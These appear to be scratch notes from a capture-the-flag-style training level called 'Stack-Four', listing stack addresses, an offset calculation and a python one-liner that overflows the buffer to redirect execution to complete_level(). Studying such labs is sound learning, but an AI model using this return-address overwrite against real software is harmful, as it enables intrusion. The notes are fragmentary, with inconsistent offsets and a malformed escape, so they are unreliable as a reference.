# Stack-Four

0x0000fffffffffb90 stack after stp in start level
0x0000fffffffffc00 after stp in main

c00-b90 = 70

aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa to overflow the stack back to the beginning (x29)

0x0000000000400714 complete_level()

python -c 'print "a"*96 + "\x40\x07\x14"' | ./stack-four

0x0000000000400748

aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x00\x00\x0\x0\x0\x40\x07\x14

0x40078c this is the actual return address

0xfffffffffba0